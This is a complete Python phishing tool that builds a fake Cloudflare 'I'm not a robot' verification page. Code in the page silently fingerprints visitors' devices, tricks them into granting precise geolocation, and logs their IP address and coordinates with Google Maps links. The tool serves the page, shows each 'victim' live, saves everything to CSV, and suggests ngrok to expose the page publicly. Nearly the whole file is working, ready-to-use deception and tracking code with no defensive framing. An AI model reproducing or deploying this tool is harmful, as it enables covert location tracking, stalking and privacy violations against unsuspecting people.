import os
import sys
import tempfile
import subprocess
import shutil
import time
import json
import threading
from datetime import datetime
from pathlib import Path

# Global variables
current_session = None
monitoring = False
SCRIPT_DIR = Path(__file__).parent.absolute()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def header():
    clear_screen()
    print(''' 
    $$\                       $$\                                             $$\                     
    $$ |                      $$ |                                            $$ |                    
    $$ | $$$$$$\   $$$$$$$\ $$$$$$\    $$$$$$$\  $$$$$$\   $$$$$$\  $$$$$$$\  $$ | $$$$$$\   $$$$$$$\ 
    $$ | \____$$\ $$  _____|\_$$  _|  $$  _____|$$  __$$\ $$  __$$\ $$  __$$\ $$ |$$  __$$\ $$  _____|
    $$ | $$$$$$$ |\$$$$$$\    $$ |    \$$$$$$\  $$$$$$$$ |$$$$$$$$ |$$ |  $$ |$$ |$$ /  $$ |$$ /      
    $$ |$$  __$$ | \____$$\   $$ |$$\  \____$$\ $$   ____|$$   ____|$$ |  $$ |$$ |$$ |  $$ |$$ |      
    $$ |\$$$$$$$ |$$$$$$$  |  \$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\ $$ |  $$ |$$ |\$$$$$$  |\$$$$$$$\ 
    \__| \_______|\_______/    \____/ \_______/  \_______| \_______|\__|  \__|\__| \______/  \_______|
                                                                                                      
                                           BY SUPERXEON                                                                        
''')

def setup_directories():
    """Setup permanent logs directory"""
    logs_dir = SCRIPT_DIR / 'logs'
    logs_dir.mkdir(exist_ok=True)
    db_dir = SCRIPT_DIR / 'db'
    db_dir.mkdir(exist_ok=True)
    return logs_dir, db_dir

class PhishingSession:
    def __init__(self, redirect_url, port=8080):
        self.redirect_url = redirect_url
        self.port = port
        self.temp_dir = None
        self.logs_dir = None
        self.db_dir = None
        self.process = None
        self.victims_count = 0
        
    def generate_files(self):
        """Generate HTML and PHP handlers in temp directory"""
        # Setup permanent directories
        self.logs_dir, self.db_dir = setup_directories()
        
        # Clear old logs
        for log_file in ['info.txt', 'result.txt', 'error.txt', 'maps.txt']:
            log_path = self.logs_dir / log_file
            if log_path.exists():
                log_path.unlink()
            log_path.touch()
        
        # Create temp directory
        self.temp_dir = Path(tempfile.mkdtemp(prefix='phishing_'))
        
        # Get absolute path for logs (for PHP handlers)
        logs_absolute = str(self.logs_dir.absolute()).replace('\\', '/')
        
        # ===== PHP HANDLERS =====
        
        # info_handler.php
        info_handler = f'''<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$data = $_POST;
$data['ip'] = $_SERVER['REMOTE_ADDR'];
$data['timestamp'] = date('Y-m-d H:i:s');
$data['user_agent'] = $_SERVER['HTTP_USER_AGENT'];

$logFile = '{logs_absolute}/info.txt';
file_put_contents($logFile, json_encode($data) . "\\n", FILE_APPEND);

echo json_encode(['status' => 'success']);
?>'''
        
        # result_handler.php
        result_handler = f'''<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$data = $_POST;
$data['ip'] = $_SERVER['REMOTE_ADDR'];
$data['timestamp'] = date('Y-m-d H:i:s');

$logFile = '{logs_absolute}/result.txt';
file_put_contents($logFile, json_encode($data) . "\\n", FILE_APPEND);

if (isset($data['Lat']) && isset($data['Lon'])) {{
    $lat = str_replace(' deg', '', $data['Lat']);
    $lon = str_replace(' deg', '', $data['Lon']);
    $mapsUrl = "https://www.google.com/maps/place/{{$lat}}+{{$lon}}";
    file_put_contents('{logs_absolute}/maps.txt', $mapsUrl . "\\n", FILE_APPEND);
}}

echo json_encode(['status' => 'success']);
?>'''
        
        # error_handler.php
        error_handler = f'''<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$data = $_POST;
$data['ip'] = $_SERVER['REMOTE_ADDR'];
$data['timestamp'] = date('Y-m-d H:i:s');

$logFile = '{logs_absolute}/error.txt';
file_put_contents($logFile, json_encode($data) . "\\n", FILE_APPEND);

echo json_encode(['status' => 'error']);
?>'''
        
        # Write PHP handlers to temp directory (same level as index.html)
        (self.temp_dir / 'info_handler.php').write_text(info_handler, encoding='utf-8')
        (self.temp_dir / 'result_handler.php').write_text(result_handler, encoding='utf-8')
        (self.temp_dir / 'error_handler.php').write_text(error_handler, encoding='utf-8')
        
        # ===== HTML WEBSITE =====
        website = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #333; }
        .container { text-align: center; max-width: 500px; padding: 2rem; }
        h2 { font-size: 1.5rem; font-weight: 500; margin-bottom: 2rem; }
        .verification-box { border: 2px solid #d9d9d9; border-radius: 4px; padding: 1.5rem; background: #fafafa; margin-bottom: 2rem; }
        .checkbox-container { display: flex; align-items: center; gap: 1rem; cursor: pointer; user-select: none; }
        .checkbox { width: 28px; height: 28px; border: 2px solid #d9d9d9; border-radius: 3px; background: #fff; position: relative; cursor: pointer; transition: all 0.3s; flex-shrink: 0; }
        .checkbox:hover { border-color: #b3b3b3; }
        .checkbox.checked { background: #4caf50; border-color: #4caf50; }
        .checkmark { display: none; position: absolute; left: 8px; top: 3px; width: 7px; height: 14px; border: solid white; border-width: 0 2.5px 2.5px 0; transform: rotate(45deg); }
        .checkbox.checked .checkmark { display: block; animation: checkAnim 0.3s ease; }
        @keyframes checkAnim { 0% { height: 0; } 100% { height: 14px; } }
        .spinner { display: none; width: 20px; height: 20px; border: 2px solid #f3f3f3; border-top: 2px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin-left: auto; }
        .spinner.active { display: block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .logo { display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid #e0e0e0; }
        .success { display: none; color: #4caf50; font-weight: 500; margin-top: 1rem; }
        .success.show { display: block; }
        .info { font-size: 0.9rem; color: #666; margin-top: 2rem; }
        .ray { font-family: monospace; font-size: 0.75rem; color: #999; margin-top: 2rem; }
    </style>
    <div class="container">
        <h2>Verify you are human</h2>
        <div class="verification-box">
            <div class="checkbox-container" id="container">
                <div class="checkbox" id="checkbox"><div class="checkmark"></div></div>
                <label>I'm not a robot</label>
                <div class="spinner" id="spinner"></div>
            </div>
            <div class="logo">
                <div>
                    <div style="font-size: 0.75rem; color: #999;">Protected by</div>
                    <div style="font-weight: 500; color: #333;">Cloudflare</div>
                </div>
            </div>
        </div>
        <div class="success" id="success">Verification complete</div>
        <div class="info">By completing this challenge, you help protect this site.</div>
        <div class="ray">Ray ID: <span id="rayId"></span></div>
    </div>
    <script>
        const REDIRECT_URL = 'REDIRECT_URL_HERE';
        const checkbox = document.getElementById('checkbox');
        const container = document.getElementById('container');
        const spinner = document.getElementById('spinner');
        const success = document.getElementById('success');
        document.getElementById('rayId').textContent = Array.from({ length: 16 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
        
        function collectDeviceInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            let ven = 'Not Available', ren = 'Not Available';
            
            if (gl) {
                try {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                } catch(e) {
                    console.log('GPU info not available');
                }
            }
            
            const ua = navigator.userAgent;
            let brw = 'Not Available';
            let str = ua;
            
            if (ua.indexOf('Firefox') != -1) {
                str = str.substring(str.indexOf(' Firefox/') + 1);
                str = str.split(' ');
                brw = str[0];
            }
            else if (ua.indexOf('Chrome') != -1) {
                str = str.substring(str.indexOf(' Chrome/') + 1);
                str = str.split(' ');
                brw = str[0];
            }
            else if (ua.indexOf('Safari') != -1) {
                str = str.substring(str.indexOf(' Safari/') + 1);
                str = str.split(' ');
                brw = str[0];
            }
            else if (ua.indexOf('Edge') != -1) {
                str = str.substring(str.indexOf(' Edge/') + 1);
                str = str.split(' ');
                brw = str[0];
            }
            
            let os = ua;
            os = os.substring(0, os.indexOf(')'));
            os = os.split(';');
            os = os[1];
            if (os == undefined) {
                os = 'Not Available';
            }
            os = os.trim();
            
            return {
                Ptf: navigator.platform,
                Brw: brw,
                Cc: navigator.hardwareConcurrency || 'Not Available',
                Ram: navigator.deviceMemory || 'Not Available',
                Ven: ven,
                Ren: ren,
                Ht: screen.height,
                Wd: screen.width,
                Os: os
            };
        }
        
        function sendDeviceInfo(data) { 
            $.ajax({ 
                type: 'POST', 
                url: 'info_handler.php', 
                data: data,
                success: function(response) {
                    console.log('[OK] Device info sent');
                },
                error: function(xhr, status, error) {
                    console.error('[ERROR] Failed to send device info:', error);
                }
            }); 
        }
        
        function sendLocation(lat, lon, acc, alt, dir, spd) { 
            console.log('[DEBUG] Sending location:', lat, lon);
            $.ajax({ 
                type: 'POST', 
                url: 'result_handler.php', 
                data: { 
                    Status: 'success',
                    Lat: lat,
                    Lon: lon,
                    Acc: acc,
                    Alt: alt,
                    Dir: dir,
                    Spd: spd
                },
                success: function(response) {
                    console.log('[OK] Location sent successfully');
                },
                error: function(xhr, status, error) {
                    console.error('[ERROR] Failed to send location:', error);
                }
            }); 
        }
        
        function sendError(errorMsg) { 
            console.log('[DEBUG] Sending error:', errorMsg);
            $.ajax({ 
                type: 'POST', 
                url: 'error_handler.php', 
                data: { 
                    Status: 'failed',
                    Error: errorMsg
                },
                success: function(response) {
                    console.log('[OK] Error logged');
                },
                error: function(xhr, status, error) {
                    console.error('[ERROR] Failed to send error:', error);
                }
            }); 
        }
        
        window.addEventListener('load', () => { 
            sendDeviceInfo(collectDeviceInfo()); 
        });
        
        container.addEventListener('click', function () {
            if (checkbox.classList.contains('checked')) return;
            
            if (navigator.geolocation) {
                spinner.classList.add('active');
                container.style.cursor = 'default';
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude, accuracy, altitude, heading, speed } = position.coords;
                        
                        let lat = latitude ? latitude + ' deg' : 'Not Available';
                        let lon = longitude ? longitude + ' deg' : 'Not Available';
                        let acc = accuracy ? accuracy + ' m' : 'Not Available';
                        let alt = altitude ? altitude + ' m' : 'Not Available';
                        let dir = heading ? heading + ' deg' : 'Not Available';
                        let spd = speed ? speed + ' m/s' : 'Not Available';
                        
                        sendLocation(lat, lon, acc, alt, dir, spd);
                        
                        setTimeout(() => {
                            spinner.classList.remove('active');
                            checkbox.classList.add('checked');
                            success.classList.add('show');
                            setTimeout(() => {
                                success.innerHTML = 'Verification complete - Redirecting...';
                                setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
                            }, 1000);
                        }, 1500);
                    },
                    (error) => {
                        spinner.classList.remove('active');
                        container.style.cursor = 'pointer';
                        
                        let errorMsg = '';
                        switch (error.code) {
                            case error.PERMISSION_DENIED: 
                                errorMsg = 'User denied the request for Geolocation'; 
                                break;
                            case error.POSITION_UNAVAILABLE: 
                                errorMsg = 'Location information is unavailable'; 
                                break;
                            case error.TIMEOUT: 
                                errorMsg = 'The request to get user location timed out'; 
                                break;
                            default: 
                                errorMsg = 'An unknown error occurred';
                        }
                        
                        sendError(errorMsg);
                        alert(errorMsg + '. Redirecting anyway...');
                        setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 30000,
                        maximumAge: 0 
                    }
                );
            }
        });
    </script>
</body>
</html>'''
        
        website = website.replace('REDIRECT_URL_HERE', self.redirect_url)
        
        # Write HTML to temp
        (self.temp_dir / 'index.html').write_text(website, encoding='utf-8')
        
        print("\n[+] Files generated")
        print("[*] HTML: " + str(self.temp_dir))
        print("[*] Logs: " + str(self.logs_dir))
        
    def start_server(self):
        """Start PHP server"""
        cmd = ['php', '-S', f'0.0.0.0:{self.port}', '-t', str(self.temp_dir)]
        self.process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        print("\n[+] Server started: http://localhost:" + str(self.port))
        print("[*] Redirect URL: " + self.redirect_url)
        
    def monitor_logs(self):
        """Monitor log files for new victims - REAL TIME"""
        info_log = self.logs_dir / 'info.txt'
        result_log = self.logs_dir / 'result.txt'
        error_log = self.logs_dir / 'error.txt'
        
        info_lines_shown = 0
        result_lines_shown = 0
        error_lines_shown = 0
        
        print("[*] Real-time monitoring active...")
        print("[*] Logs location: " + str(self.logs_dir))
        print("[*] Waiting for victims...\n")
        
        while monitoring:
            try:
                # Check info log
                if info_log.exists():
                    with open(info_log, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                        if len(lines) > info_lines_shown:
                            for i in range(info_lines_shown, len(lines)):
                                line = lines[i].strip()
                                if line:
                                    try:
                                        data = json.loads(line)
                                        self.victims_count += 1
                                        self.display_victim_info(data)
                                        self.save_to_csv(data, None)
                                    except json.JSONDecodeError:
                                        pass
                            info_lines_shown = len(lines)
                
                # Check result log
                if result_log.exists():
                    with open(result_log, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                        if len(lines) > result_lines_shown:
                            for i in range(result_lines_shown, len(lines)):
                                line = lines[i].strip()
                                if line:
                                    try:
                                        data = json.loads(line)
                                        self.display_location_info(data)
                                        self.save_to_csv(None, data)
                                    except json.JSONDecodeError:
                                        pass
                            result_lines_shown = len(lines)
                
                # Check error log
                if error_log.exists():
                    with open(error_log, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                        if len(lines) > error_lines_shown:
                            for i in range(error_lines_shown, len(lines)):
                                line = lines[i].strip()
                                if line:
                                    try:
                                        data = json.loads(line)
                                        self.display_error_info(data)
                                    except json.JSONDecodeError:
                                        pass
                            error_lines_shown = len(lines)
                
                time.sleep(0.2)
                
            except Exception as e:
                print("[!] Monitor error: " + str(e))
                time.sleep(1)
    
    def display_victim_info(self, data):
        """Display victim device info"""
        try:
            print("\n" + "="*70)
            print("[+] NEW VICTIM #" + str(self.victims_count))
            print("[+] Time: " + str(data.get('timestamp', 'N/A')))
            print("="*70)
            print("\n[!] Device Information:")
            print("")
            print("[+] IP Address   : " + str(data.get('ip', 'N/A')))
            print("[+] OS           : " + str(data.get('Os', 'N/A')))
            print("[+] Platform     : " + str(data.get('Ptf', 'N/A')))
            print("[+] Browser      : " + str(data.get('Brw', 'N/A')))
            print("[+] CPU Cores    : " + str(data.get('Cc', 'N/A')))
            print("[+] RAM          : " + str(data.get('Ram', 'N/A')) + " GB")
            print("[+] GPU Vendor   : " + str(data.get('Ven', 'N/A')))
            print("[+] GPU Renderer : " + str(data.get('Ren', 'N/A')))
            print("[+] Resolution   : " + str(data.get('Wd', 'N/A')) + "x" + str(data.get('Ht', 'N/A')))
            
            print("\n" + "="*70)
            print("[*] Waiting for victim to allow location access...")
            print("="*70 + "\n")
            
        except Exception as e:
            print("[!] Display error: " + str(e))
        
        sys.stdout.flush()
    
    def display_location_info(self, data):
        """Display victim location"""
        try:
            print("\n" + "="*70)
            print("[!] LOCATION CAPTURED!")
            print("[+] Time: " + str(data.get('timestamp', 'N/A')))
            print("="*70)
            print("\n[!] Location Information:")
            print("")
            print("[+] Latitude     : " + str(data.get('Lat', 'N/A')))
            print("[+] Longitude    : " + str(data.get('Lon', 'N/A')))
            print("[+] Accuracy     : " + str(data.get('Acc', 'N/A')))
            print("[+] Altitude     : " + str(data.get('Alt', 'N/A')))
            print("[+] Direction    : " + str(data.get('Dir', 'N/A')))
            print("[+] Speed        : " + str(data.get('Spd', 'N/A')))
            
            lat = str(data.get('Lat', '')).replace(' deg', '').strip()
            lon = str(data.get('Lon', '')).replace(' deg', '').strip()
            
            if lat and lon and lat != 'N/A' and lon != 'Not Available':
                maps_url = "https://www.google.com/maps/place/" + lat + "+" + lon
                print("")
                print("[+] Google Maps  : " + maps_url)
            
            print("\n" + "="*70)
            print("[+] All data saved to: " + str(self.logs_dir))
            print("="*70 + "\n")
            
        except Exception as e:
            print("[!] Display error: " + str(e))
        
        sys.stdout.flush()
    
    def display_error_info(self, data):
        """Display error info"""
        try:
            print("\n" + "="*70)
            print("[!] ERROR FROM VICTIM")
            print("[+] Time: " + str(data.get('timestamp', 'N/A')))
            print("="*70)
            print("\n[-] Error: " + str(data.get('Error', 'Unknown error')))
            print("\n" + "="*70 + "\n")
        except Exception as e:
            print("[!] Display error: " + str(e))
        
        sys.stdout.flush()
    
    def save_to_csv(self, info_data, location_data):
        """Save data to CSV like Seeker"""
        try:
            csv_file = self.db_dir / 'results.csv'
            
            # Create CSV if not exists
            if not csv_file.exists():
                with open(csv_file, 'w', encoding='utf-8') as f:
                    f.write('OS,Platform,CPU_Cores,RAM,GPU_Vendor,GPU_Renderer,Resolution,Browser,IP,Latitude,Longitude,Accuracy,Altitude,Direction,Speed,Timestamp\n')
            
            # Build row
            row = []
            
            if info_data:
                row.append(str(info_data.get('Os', 'N/A')))
                row.append(str(info_data.get('Ptf', 'N/A')))
                row.append(str(info_data.get('Cc', 'N/A')))
                row.append(str(info_data.get('Ram', 'N/A')))
                row.append(str(info_data.get('Ven', 'N/A')))
                row.append(str(info_data.get('Ren', 'N/A')))
                row.append(str(info_data.get('Wd', 'N/A')) + 'x' + str(info_data.get('Ht', 'N/A')))
                row.append(str(info_data.get('Brw', 'N/A')))
                row.append(str(info_data.get('ip', 'N/A')))
            else:
                row.extend(['N/A'] * 9)
            
            if location_data:
                row.append(str(location_data.get('Lat', 'N/A')))
                row.append(str(location_data.get('Lon', 'N/A')))
                row.append(str(location_data.get('Acc', 'N/A')))
                row.append(str(location_data.get('Alt', 'N/A')))
                row.append(str(location_data.get('Dir', 'N/A')))
                row.append(str(location_data.get('Spd', 'N/A')))
                row.append(str(location_data.get('timestamp', 'N/A')))
            else:
                row.extend(['N/A'] * 7)
            
            # Write row
            with open(csv_file, 'a', encoding='utf-8') as f:
                f.write(','.join(['"' + str(x).replace('"', '""') + '"' for x in row]) + '\n')
                
        except Exception as e:
            print("[!] CSV save error: " + str(e))
    
    def cleanup(self):
        """Stop server and clean up"""
        global monitoring
        monitoring = False
        
        if self.process:
            self.process.terminate()
            self.process.wait()
            print("\n[*] Server stopped")
        
        if self.temp_dir and self.temp_dir.exists():
            shutil.rmtree(self.temp_dir)
            print("[*] Cleaned temp files")
        
        print("[+] All logs saved permanently in: " + str(self.logs_dir))

def forward_link():
    """Handle forward link option"""
    global current_session, monitoring
    
    header()
    print("\n[+] FORWARD LINK MODE")
    print("="*60)
    url = input("\n[?] Enter redirect URL (e.g., https://google.com): ").strip()
    
    if not url:
        print("[!] URL cannot be empty!")
        input("\nPress Enter to continue...")
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    port = 8080
    print("\n[*] Setting up phishing page...")
    
    try:
        current_session = PhishingSession(url, port)
        current_session.generate_files()
        current_session.start_server()
        
        monitoring = True
        monitor_thread = threading.Thread(target=current_session.monitor_logs, daemon=True)
        monitor_thread.start()
        
        print("\n" + "="*60)
        print("[+] PHISHING SERVER ACTIVE")
        print("="*60)
        print("\n[*] Share this link to victims:")
        print("   Local: http://localhost:" + str(port))
        print("   Network: http://YOUR_IP:" + str(port))
        print("\n[!] Tip: Use ngrok or cloudflared for public URL")
        print("   Example: ngrok http " + str(port))
        print("\n" + "="*60 + "\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n[!] Stopping server...")
            current_session.cleanup()
            input("\nPress Enter to continue...")
            
    except Exception as e:
        print("\n[!] Error: " + str(e))
        import traceback
        traceback.print_exc()
        if current_session:
            current_session.cleanup()
        input("\nPress Enter to continue...")

def generate_application():
    """Handle application templates"""
    header()
    print("\n[+] APPLICATION TEMPLATES")
    print("="*60)
    print('''
    1. WhatsApp Web
    2. Google Drive
    3. Telegram
    4. Canva
    5. Facebook
    
    [!] Other applications coming soon...
    ''')
    print("="*60)
    input("\nPress Enter to go back...")

def first_choice():
    """Main menu"""
    while True:
        header()
        print("\n[+] PHISHING TOOL MENU")
        print("="*60)
        print('''
    1. Use Forward Link (Redirect to custom URL)
    2. Use Application Template (Coming Soon)
    3. Exit
        ''')
        print("="*60)
        
        try:
            choice = input("\n[?] Your choice: ").strip()
            
            if choice == '1':
                forward_link()
            elif choice == '2':
                generate_application()
            elif choice == '3':
                print("\n[!] Goodbye!")
                sys.exit(0)
            else:
                print("\n[!] Invalid choice! Please select 1, 2, or 3")
                input("\nPress Enter to continue...")
                
        except KeyboardInterrupt:
            print("\n\n[!] Goodbye!")
            if current_session:
                current_session.cleanup()
            sys.exit(0)
        except Exception as e:
            print("\n[!] Error: " + str(e))
            input("\nPress Enter to continue...")

if __name__ == '__main__':
    try:
        first_choice()
    except KeyboardInterrupt:
        print("\n\n[!] Exiting...")
        if current_session:
            current_session.cleanup()
        sys.exit(0)